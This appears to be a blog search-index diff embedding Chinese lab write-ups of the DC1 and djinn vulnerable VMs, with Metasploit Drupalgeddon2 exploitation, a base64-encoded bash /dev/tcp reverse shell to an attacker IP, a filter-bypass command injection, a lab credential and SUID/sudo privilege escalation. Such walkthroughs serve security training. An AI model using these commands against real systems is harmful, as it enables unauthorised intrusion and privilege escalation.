+6  exploit/unix/webapp/drupal_restws_unserialize  2019-02-20       normal     Yes    Drupal RESTful Web Services unserialize() RCE&lt;br&gt;
+7  exploit/unix/webapp/php_xmlrpc_eval            2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution&lt;/p&gt;
+&lt;p&gt;Interact with a module by name or index. For example info 7, use 7 or use exploit/unix/webapp/php_xmlrpc_eval&lt;/p&gt;
+&lt;p&gt;&lt;font color=&#39;red&#39;&gt;msf6 &amp;gt; use exploit/unix/webapp/drupal_drupalgeddon2&lt;/font&gt;&lt;br&gt;
+[*] No payload configured, defaulting to php/meterpreter/reverse_tcp&lt;br&gt;
+&lt;font color=&#39;red&#39;&gt;msf6 exploit(unix/webapp/drupal_drupalgeddon2) &amp;gt; set Rhost 192.168.0.119&lt;/font&gt;&lt;br&gt;
+Rhost =&amp;gt; 192.168.0.119&lt;br&gt;
+&lt;font color=&#39;red&#39;&gt;msf6 exploit(unix/webapp/drupal_drupalgeddon2) &amp;gt; set Lhost 192.168.0.150&lt;/font&gt;&lt;br&gt;
+Lhost =&amp;gt; 192.168.0.150&lt;br&gt;
+&lt;font color=&#39;red&#39;&gt;msf6 exploit(unix/webapp/drupal_drupalgeddon2) &amp;gt; set Payload php/meterpreter/reverse_tcp&lt;/font&gt;&lt;br&gt;
+Payload =&amp;gt; php/meterpreter/reverse_tcp&lt;br&gt;
+&lt;font color=&#39;red&#39;&gt;msf6 exploit(unix/webapp/drupal_drupalgeddon2) &amp;gt; exploit&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;[&lt;em&gt;] Started reverse TCP handler on 192.168.0.150:4444&lt;br&gt;
+[&lt;/em&gt;] Executing automatic check (disable AutoCheck to override)&lt;br&gt;
+[!] The service is running, but could not be validated.&lt;br&gt;
+[&lt;em&gt;] Sending stage (39282 bytes) to 192.168.0.119&lt;br&gt;
+[&lt;/em&gt;] Meterpreter session 1 opened (192.168.0.150:4444 -&amp;gt; 192.168.0.119:41989) at 2021-08-22 15:28:16 +0800&lt;/p&gt;
+&lt;p&gt;&lt;font color=&#39;red&#39;&gt;meterpreter &amp;gt; &lt;/font&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h5 id=&#34;5提权&#34;&gt;5.提权&lt;/h5&gt;
+&lt;p&gt;上传提权脚本LinEnum.sh&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;font color=&#39;red&#39;&gt;meterpreter &amp;gt; upload ./LinEnum.sh /tmp/&lt;/font&gt;&lt;br&gt;
+[&lt;em&gt;] uploading  : /root/桌面/LinEnum.sh -&amp;gt; /tmp/&lt;br&gt;
+[&lt;/em&gt;] uploaded   : /root/桌面/LinEnum.sh -&amp;gt; /tmp//LinEnum.sh&lt;br&gt;
+&lt;font color=&#39;red&#39;&gt;meterpreter &amp;gt; shell&lt;/font&gt;&lt;br&gt;
+Process 3111 created.&lt;br&gt;
+Channel 2 created.&lt;/p&gt;
+&lt;p&gt;&lt;font color=&#39;orange&#39;&gt;whoami&lt;/font&gt;&lt;br&gt;
+&lt;font color=&#39;orange&#39;&gt;www-data&lt;/font&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;获得www-data的shell&lt;/p&gt;
+&lt;h5 id=&#34;&#34;&gt;&lt;/h5&gt;
+&lt;h5 id=&#34;6进一步提权&#34;&gt;6.进一步提权&lt;/h5&gt;
+&lt;p&gt;运行LinEnum.sh文件&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;cd /tmp&lt;br&gt;
+ls&lt;br&gt;
+LinEnum.sh&lt;br&gt;
+bash ./LinEnum.sh&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;得到很多输出，关注以下部分&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629728845281.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;可以通过find命令带入另外命令&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;find LinEnum.sh -exec &#39;whoami&#39; \;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629728857887.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;可以看到回显是root&lt;/p&gt;
+&lt;p&gt;那可以通过调用root的shell来提权，注意是调用sh或dash才可以获取root权限下shell&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;6&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629728867478.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;三-实验总结&#34;&gt;三、实验总结&lt;/h2&gt;
+&lt;p&gt;1、drupal框架，在billu b0x2靶机有遇到过，所以很容易入手，通过msf可以很快实现反弹&lt;/p&gt;
+&lt;p&gt;2、提权脚本运行，可以获得www-data的shell，find可附带命令，通过setuid标志可以&lt;/p&gt;
+&lt;p&gt;提为root权限&lt;/p&gt;
+">渗透测试之DC1</a>
+      </div>
+      
+      <div class="item">
+        <a class="result-title" style="opacity: 0;" href="https://damoxilai.github.io/post/shen-tou-ce-shi-zhi-djinn/"" data-c="
+          &lt;h2 id=&#34;一-实验环境&#34;&gt;一、实验环境&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;靶机：ip暂未知&lt;/li&gt;
+&lt;li&gt;攻击机kali：192.168.0.150&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;二-实验过程&#34;&gt;二、实验过程&lt;/h2&gt;
+&lt;h5 id=&#34;1主机发现&#34;&gt;1.主机发现&lt;/h5&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629716476334.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;h5 id=&#34;2扫描端口&#34;&gt;2.扫描端口&lt;/h5&gt;
+&lt;pre&gt;&lt;code&gt;nmap -sS -sV -T5 -A -p- 192.168.0.102
+&lt;/code&gt;&lt;/pre&gt;
+&lt;blockquote&gt;
+&lt;p&gt;┌──(root💀kali)-[~/桌面]&lt;br&gt;
+└─# nmap -sS -sV -T5 -A -p- 192.168.0.102&lt;br&gt;
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-21 17:51 CST&lt;br&gt;
+Nmap scan report for 192.168.0.102&lt;br&gt;
+Host is up (0.0066s latency).&lt;br&gt;
+Not shown: 65531 closed ports&lt;br&gt;
+PORT     STATE    SERVICE VERSION&lt;br&gt;
+&lt;font color=&#39;red&#39;&gt;21/tcp   open     ftp     vsftpd 3.0.3&lt;/font&gt;&lt;br&gt;
+| ftp-anon:&lt;font color=&#39;orange&#39;&gt; Anonymous FTP login allowed &lt;/font&gt;(FTP code 230)&lt;br&gt;
+| -rw-r--r--    1 0        0              11 Oct 20  2019 creds.txt&lt;br&gt;
+| -rw-r--r--    1 0        0             128 Oct 21  2019 game.txt&lt;br&gt;
+|&lt;em&gt;-rw-r--r--    1 0        0             113 Oct 21  2019 message.txt&lt;br&gt;
+| ftp-syst:&lt;br&gt;
+|   STAT:&lt;br&gt;
+| FTP server status:&lt;br&gt;
+|      Connected to ::ffff:192.168.0.150&lt;br&gt;
+|      Logged in as ftp&lt;br&gt;
+|      TYPE: ASCII&lt;br&gt;
+|      No session bandwidth limit&lt;br&gt;
+|      Session timeout in seconds is 300&lt;br&gt;
+|      Control connection is plain text&lt;br&gt;
+|      Data connections will be plain text&lt;br&gt;
+|      At session startup, client count was 1&lt;br&gt;
+|      vsFTPd 3.0.3 - secure, fast, stable&lt;br&gt;
+|&lt;em&gt;End of status&lt;br&gt;
+&lt;font color=&#39;red&#39;&gt;22/tcp   filtered ssh&lt;/font&gt;&lt;br&gt;
+&lt;font color=&#39;red&#39;&gt;1337/tcp open     waste?&lt;/font&gt;&lt;br&gt;
+| fingerprint-strings:&lt;br&gt;
+|   NULL:&lt;br&gt;
+|     ____ _____ _&lt;br&gt;
+|     &lt;em&gt;&lt;em&gt;&lt;em&gt;| __ _ _ __ ___ ___ |&lt;/em&gt; &lt;em&gt;(&lt;/em&gt;)&lt;/em&gt; __ ___ ___&lt;br&gt;
+|     \x20/ _ \x20 | | | | &#39;&lt;/em&gt; &lt;code&gt;_ \x20/ _ \n| |_| | (_| | | | | | | __/ | | | | | | | | | __/ | ____|__,_|_| |_| |_|___| |_| |_|_| |_| |_|___| | &amp;lt;font color=&#39;orange&#39;&amp;gt; Let&#39;s see how good you are with simple maths&amp;lt;/font&amp;gt; | &amp;lt;font color=&#39;orange&#39;&amp;gt; Answer my questions 1000 times and I&#39;ll give you your gift.&amp;lt;/font&amp;gt; | &#39;-&#39;, 2) | RPCCheck: | ____ _____ _ | ___| __ _ _ __ ___ ___ |_ _(_)_ __ ___ ___ | \x20/ _ \x20 | | | | &#39;_&lt;/code&gt; _ \x20/ _ \n| |&lt;/em&gt;| | (&lt;/em&gt;| | | | | | | &lt;strong&gt;/ | | | | | | | | | &lt;strong&gt;/&lt;br&gt;
+|     ____|&lt;/strong&gt;,&lt;em&gt;|&lt;/em&gt;| |&lt;em&gt;| |&lt;/em&gt;|&lt;/strong&gt;&lt;em&gt;| |&lt;/em&gt;| |&lt;em&gt;|&lt;/em&gt;| |&lt;em&gt;| |&lt;/em&gt;|__&lt;em&gt;|&lt;br&gt;
+|     Let&#39;s see how good you are with simple maths&lt;br&gt;
+|     Answer my questions 1000 times and I&#39;ll give you your gift.&lt;br&gt;
+|&lt;/em&gt;    &#39;/&#39;, 6)&lt;br&gt;
+&lt;font color=&#39;red&#39;&gt;7331/tcp open     http    Werkzeug httpd 0.16.0 (Python 2.7.15+)&lt;/font&gt;&lt;br&gt;
+|_http-title: Lost in space&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;21、22、1337、7331端口开放，ftp有匿名账户可以登陆&lt;/p&gt;
+&lt;h5 id=&#34;3登陆ftp&#34;&gt;3.登陆ftp&lt;/h5&gt;
+&lt;blockquote&gt;
+&lt;p&gt;┌──(root💀kali)-[~/桌面]&lt;br&gt;
+└─# ftp 192.168.0.102&lt;br&gt;
+Connected to 192.168.0.102.&lt;br&gt;
+220 (vsFTPd 3.0.3)&lt;br&gt;
+Name (192.168.0.102:root):&lt;font color=&#39;orange&#39;&gt; anonymous&lt;/font&gt;&lt;br&gt;
+331 Please specify the password.&lt;br&gt;
+Password:&lt;br&gt;
+230 Login successful.&lt;br&gt;
+Remote system type is UNIX.&lt;br&gt;
+Using binary mode to transfer files.&lt;br&gt;
+ftp&amp;gt; ls&lt;br&gt;
+200 PORT command successful. Consider using PASV.&lt;br&gt;
+150 Here comes the directory listing.&lt;br&gt;
+-rw-r--r--    1 0        0              11 Oct 20  2019 creds.txt&lt;br&gt;
+-rw-r--r--    1 0        0             128 Oct 21  2019 game.txt&lt;br&gt;
+-rw-r--r--    1 0        0             113 Oct 21  2019 message.txt&lt;br&gt;
+226 Directory send OK.&lt;br&gt;
+&lt;font color=&#39;red&#39;&gt;ftp&amp;gt; mget *.*&lt;/font&gt;&lt;br&gt;
+mget creds.txt?&lt;br&gt;
+200 PORT command successful. Consider using PASV.&lt;br&gt;
+150 Opening BINARY mode data connection for creds.txt (11 bytes).&lt;br&gt;
+226 Transfer complete.&lt;br&gt;
+11 bytes received in 0.00 secs (31.3183 kB/s)&lt;br&gt;
+mget game.txt?&lt;br&gt;
+200 PORT command successful. Consider using PASV.&lt;br&gt;
+150 Opening BINARY mode data connection for game.txt (128 bytes).&lt;br&gt;
+226 Transfer complete.&lt;br&gt;
+128 bytes received in 0.01 secs (8.3853 kB/s)&lt;br&gt;
+mget message.txt?&lt;br&gt;
+200 PORT command successful. Consider using PASV.&lt;br&gt;
+150 Opening BINARY mode data connection for message.txt (113 bytes).&lt;br&gt;
+226 Transfer complete.&lt;br&gt;
+113 bytes received in 0.00 secs (309.1080 kB/s)&lt;br&gt;
+ftp&amp;gt; bye&lt;br&gt;
+221 Goodbye.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;mget把文件下载到本地&lt;/p&gt;
+&lt;p&gt;查看&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;┌──(root💀kali)-[~/桌面]&lt;br&gt;
+└─# cat game.txt&lt;br&gt;
+oh and I forgot to tell you I&#39;ve setup a game for you on port &lt;font color=&#39;orange&#39;&gt;1337&lt;/font&gt;. See if you can reach to the&lt;br&gt;
+final level and get the prize.&lt;/p&gt;
+&lt;p&gt;┌──(root💀kali)-[~/桌面]&lt;br&gt;
+└─# cat message.txt&lt;br&gt;
+@&lt;font color=&#39;orange&#39;&gt;nitish81299 &lt;/font&gt;I am going on holidays for few days, please take care of all the work.&lt;br&gt;
+And don&#39;t mess up anything.&lt;/p&gt;
+&lt;p&gt;┌──(root💀kali)-[~/桌面]&lt;br&gt;
+└─# cat creds.txt&lt;br&gt;
+&lt;font color=&#39;orange&#39;&gt;nitish81299 &lt;/font&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;提示1337端口有个小游戏，有nitish81299这么个账户&lt;/p&gt;
+&lt;h5 id=&#34;41337端口&#34;&gt;4.1337端口&lt;/h5&gt;
+&lt;p&gt;页面被重置，浏览器访问无果&lt;br&gt;
+&lt;img src=&#34;https://damoxilai.github.io/post-images/1629716508118.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;telnet 192.168.0.102 1337
+&lt;/code&gt;&lt;/pre&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629716528502.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;是个运算游戏，要回答1000次&lt;/p&gt;
+&lt;h5 id=&#34;57331端口&#34;&gt;5.7331端口&lt;/h5&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629716560604.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;目录扫描&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;gobuster dir -u http://192.168.0.102:7331 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt -t 15
+&lt;/code&gt;&lt;/pre&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629716585720.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;访问http://192.168.0.102:7331/wish&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629716609865.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;输入ls，回车，确实有回显文件名，只不过比较隐秘&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;6&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629716627232.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;h5 id=&#34;6反弹shell安排一下&#34;&gt;6.反弹shell安排一下&lt;/h5&gt;
+&lt;p&gt;6.1但是出错，?name=Wrong+choice+of+words，应该被过滤了&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;7&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629716638992.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;6.2尝试base64加密&lt;/p&gt;
+&lt;p&gt;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTUwLzEyMzQgMD4mMQ==| base64 -d | bash&lt;/p&gt;
+&lt;p&gt;提交&lt;/p&gt;
+&lt;p&gt;获得shell&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;8&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629716660115.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;6.3用python调用一个本地shell，方便接下来的操作&lt;/p&gt;
+&lt;p&gt;python -c &#39;import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39;&lt;/p&gt;
+&lt;p&gt;查看 app.py&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;cat app.py&lt;br&gt;
+import subprocess&lt;/p&gt;
+&lt;p&gt;from flask import Flask, redirect, render_template, request, url_for&lt;/p&gt;
+&lt;p&gt;app = Flask(&lt;strong&gt;name&lt;/strong&gt;)&lt;br&gt;
+app.secret_key = &amp;quot;key&amp;quot;&lt;/p&gt;
+&lt;p&gt;&lt;font color=&#39;orange&#39;&gt;CREDS = &amp;quot;/home/nitish/.dev/creds.txt&amp;quot;&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;RCE = [&amp;quot;/&amp;quot;, &amp;quot;.&amp;quot;, &amp;quot;?&amp;quot;, &amp;quot;*&amp;quot;, &amp;quot;^&amp;quot;, &amp;quot;$&amp;quot;, &amp;quot;eval&amp;quot;, &amp;quot;;&amp;quot;]&lt;/p&gt;
+&lt;p&gt;def validate(cmd):&lt;br&gt;
+if CREDS in cmd and &amp;quot;cat&amp;quot; not in cmd:&lt;br&gt;
+return True&lt;/p&gt;
+&lt;p&gt;try:&lt;br&gt;
+for i in RCE:&lt;br&gt;
+for j in cmd:&lt;br&gt;
+if i == j:&lt;br&gt;
+return False&lt;br&gt;
+return True&lt;br&gt;
+except Exception:&lt;br&gt;
+return False&lt;/p&gt;
+&lt;p&gt;@app.route(&amp;quot;/&amp;quot;, methods=[&amp;quot;GET&amp;quot;])&lt;br&gt;
+def index():&lt;br&gt;
+return render_template(&amp;quot;main.html&amp;quot;)&lt;/p&gt;
+&lt;p&gt;@app.route(&amp;quot;/wish&amp;quot;, methods=[&#39;POST&#39;, &amp;quot;GET&amp;quot;])&lt;br&gt;
+def wish():&lt;br&gt;
+execute = request.form.get(&amp;quot;cmd&amp;quot;)&lt;br&gt;
+if execute:&lt;br&gt;
+if validate(execute):&lt;br&gt;
+output = subprocess.Popen(execute, shell=True,&lt;br&gt;
+stdout=subprocess.PIPE).stdout.read()&lt;br&gt;
+else:&lt;br&gt;
+output = &amp;quot;Wrong choice of words&amp;quot;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt; return redirect(url_for(&amp;quot;genie&amp;quot;, name=output))
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;else:&lt;br&gt;
+return render_template(&#39;wish.html&#39;)&lt;/p&gt;
+&lt;p&gt;@app.route(&#39;/genie&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])&lt;br&gt;
+def genie():&lt;br&gt;
+if &#39;name&#39; in request.args:&lt;br&gt;
+page = request.args.get(&#39;name&#39;)&lt;br&gt;
+else:&lt;br&gt;
+page = &amp;quot;It&#39;s not that hard&amp;quot;&lt;/p&gt;
+&lt;p&gt;return render_template(&#39;genie.html&#39;, file=page)&lt;/p&gt;
+&lt;p&gt;if &lt;strong&gt;name&lt;/strong&gt; == &amp;quot;&lt;strong&gt;main&lt;/strong&gt;&amp;quot;:&lt;br&gt;
+app.run(host=&#39;0.0.0.0&#39;, debug=True)&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;6.4我们在这个文件里发现用户密码&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;www-data@djinn:/opt/80$ cat /home/nitish/.dev/creds.txt&lt;br&gt;
+cat /home/nitish/.dev/creds.txt&lt;br&gt;
+nitish:p4ssw0rdStr3r0n9&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;以该用户登陆&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;9&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629716678144.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;h5 id=&#34;7提权&#34;&gt;7.提权&lt;/h5&gt;
+&lt;p&gt;7.1sudo -l查看，发现有一个无需密码即可执行的命令，但首先得获得sam的shell&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;10&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629716694141.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;man /usr/bin/genie查看一下使用帮助&lt;/p&gt;
+&lt;p&gt;&lt;font color=&#39;orange&#39;&gt;man是manual的缩写，man命令用来提供在线帮助，通过满命令可以查看Linux中的命令帮助、配置文件帮助、编程帮助等信息&lt;/font&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;nitish@djinn:/home$&lt;font color=&#39;red&#39;&gt; man /usr/bin/genie&lt;/font&gt;&lt;br&gt;
+man /usr/bin/genie&lt;br&gt;
+WARNING: terminal is not fully functional&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;(press RETURN)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;man(8)                          genie man page                          man(8)&lt;/p&gt;
+&lt;p&gt;NAME&lt;br&gt;
+genie - Make a wish&lt;/p&gt;
+&lt;p&gt;SYNOPSIS&lt;br&gt;
+genie [-h] [-g] [-p SHELL] [-e EXEC] wish&lt;/p&gt;
+&lt;p&gt;DESCRIPTION&lt;br&gt;
+genie would complete all your wishes, even the naughty ones.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;   We  all  dream  of getting those crazy privelege escalations, this will
+   even help you acheive that.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;OPTIONS&lt;br&gt;
+wish&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;          This is the wish you want to make .
+
+   -g, --god
+
+          Sometime we all would like to make a wish to  god,  this  option
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Manual page genie(8) line 1 (press h for help or q to quit)&lt;br&gt;
+let you make wish directly to God;&lt;br&gt;
+Manual page genie(8) line 2 (press h for help or q to quit)&lt;/p&gt;
+&lt;p&gt;Manual page genie(8) line 3 (press h for help or q to quit)&lt;br&gt;
+Though  genie can&#39;t gurantee you that your wish will be heard by&lt;br&gt;
+Manual page genie(8) line 4 (press h for help or q to quit)&lt;br&gt;
+God, he&#39;s a busy man you know;&lt;br&gt;
+Manual page genie(8) line 5 (press h for help or q to quit)&lt;/p&gt;
+&lt;p&gt;Manual page genie(8) line 6 (press h for help or q to quit)&lt;br&gt;
+&lt;font color=&#39;orange&#39;&gt;  -p, --shell&lt;/font&gt;&lt;br&gt;
+Manual page genie(8) line 7 (press h for help or q to quit)&lt;/p&gt;
+&lt;p&gt;Manual page genie(8) line 8 (press h for help or q to quit)&lt;br&gt;
+Well who doesn&#39;t love those. You can get shell. Ex: -p &amp;quot;/bin/sh&amp;quot;&lt;br&gt;
+Manual page genie(8) line 9 (press h for help or q to quit)&lt;/p&gt;
+&lt;p&gt;Manual page genie(8) line 10 (press h for help or q to quit)&lt;br&gt;
+-e, --exec&lt;br&gt;
+Manual page genie(8) line 11 (press h for help or q to quit)&lt;/p&gt;
+&lt;p&gt;Manual page genie(8) line 12 (press h for help or q to quit)&lt;br&gt;
+Execute command on someone else computer is just too  damn  fun,&lt;br&gt;
+Manual page genie(8) line 13 (press h for help or q to quit)&lt;br&gt;
+but this comes with some restrictions.&lt;br&gt;
+Manual page genie(8) line 14 (press h for help or q to quit)&lt;/p&gt;
+&lt;p&gt;Manual page genie(8) line 15 (press h for help or q to quit)&lt;br&gt;
+&lt;font color=&#39;orange&#39;&gt;   -cmd&lt;/font&gt;&lt;br&gt;
+Manual page genie(8) line 16 (press h for help or q to quit)&lt;/p&gt;
+&lt;p&gt;Manual page genie(8) line 17 (press h for help or q to quit)&lt;br&gt;
+You know sometime all you new is a damn CMD, windows I love you.&lt;br&gt;
+Manual page genie(8) line 18 (press h for help or q to quit)&lt;/p&gt;
+&lt;p&gt;Manual page genie(8) line 19 (press h for help or q to quit)&lt;br&gt;
+SEE ALSO&lt;br&gt;
+Manual page genie(8) line 20 (press h for help or q to quit)&lt;br&gt;
+mzfr.github.io&lt;br&gt;
+Manual page genie(8) line 21 (press h for help or q to quit)&lt;/p&gt;
+&lt;p&gt;Manual page genie(8) line 22 (press h for help or q to quit)&lt;br&gt;
+BUGS&lt;br&gt;
+Manual page genie(8) line 23 (press h for help or q to quit)&lt;br&gt;
+There  are  shit  loads  of bug in this program, it&#39;s all about finding&lt;br&gt;
+Manual page genie(8) line 24 (press h for help or q to quit)&lt;br&gt;
+one.&lt;br&gt;
+Manual page genie(8) line 25 (press h for help or q to quit)&lt;/p&gt;
+&lt;p&gt;Manual page genie(8) line 26 (press h for help or q to quit)&lt;br&gt;
+AUTHOR&lt;br&gt;
+Manual page genie(8) line 27 (press h for help or q to quit)&lt;br&gt;
+mzfr&lt;br&gt;
+Manual page genie(8) line 28 (press h for help or q to quit)&lt;/p&gt;
+&lt;p&gt;Manual page genie(8) line 29 (press h for help or q to quit)&lt;br&gt;
+1.0                            11 November 2019                         man(8)&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;7.2使用-p参数，执行sudo -u sam /usr/bin/genie -p &amp;quot;/bin/sh&amp;quot;没有得到sam的shell&lt;/p&gt;
+&lt;p&gt;使用-cmd参数，执行sudo -u sam /usr/bin/genie -cmd id 得到sam的shell&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;11&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629716709672.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;7.3sudo -l查看，发现可执行命令&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;12&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629716720859.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;执行后没有利用价值&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;13&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629716731752.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;7.4使用命令查找可写文件&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;find / -writable -type f 2&amp;gt;/dev/null
+&lt;/code&gt;&lt;/pre&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;14&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629716742771.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;找到/home/sam/.pyc文件，strings查看&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;15&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629717009779.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;blockquote&gt;
+&lt;p&gt;pyc是一种二进制文件，是由python文件经过编译后产生的文件。它是一种byte code，python文件变成pyc文件后，加载的速度有所提高。而且pyc还是一种跨平台的字节码，由python的虚拟机来执行。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;可以发现这个程序一部分内容，在我们执行 sudo /root/loga选项的3有出现&lt;/p&gt;
+&lt;p&gt;7.5把这个文件拷贝到本地&lt;/p&gt;
+&lt;p&gt;在线反编译一下https://tool.lu/pyc/&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;16&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629716999668.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;blockquote&gt;
+&lt;p&gt;from getpass import getuser&lt;br&gt;
+from os import system&lt;br&gt;
+from random import randint&lt;/p&gt;
+&lt;p&gt;def naughtyboi():&lt;br&gt;
+print &#39;Working on it!! &#39;&lt;/p&gt;
+&lt;p&gt;def guessit():&lt;br&gt;
+num = randint(1, 101)&lt;br&gt;
+print &#39;Choose a number between 1 to 100: &#39;&lt;br&gt;
+s = input(&#39;Enter your number: &#39;)&lt;br&gt;
+&lt;font color=&#39;orange&#39;&gt;    if s == num:&lt;/font&gt;&lt;br&gt;
+&lt;font color=&#39;orange&#39;&gt;    system(&#39;/bin/sh&#39;)&lt;/font&gt;&lt;br&gt;
+else:&lt;br&gt;
+print &#39;Better Luck next time&#39;&lt;/p&gt;
+&lt;p&gt;def readfiles():&lt;br&gt;
+user = getuser()&lt;br&gt;
+path = input(&#39;Enter the full of the file to read: &#39;)&lt;br&gt;
+print &#39;User %s is not allowed to read %s&#39; % (user, path)&lt;/p&gt;
+&lt;p&gt;def options():&lt;br&gt;
+print &#39;What do you want to do ?&#39;&lt;br&gt;
+print &#39;1 - Be naughty&#39;&lt;br&gt;
+print &#39;2 - Guess the number&#39;&lt;br&gt;
+print &#39;3 - Read some damn files&#39;&lt;br&gt;
+print &#39;4 - Work&#39;&lt;br&gt;
+choice = int(input(&#39;Enter your choice: &#39;))&lt;br&gt;
+return choice&lt;/p&gt;
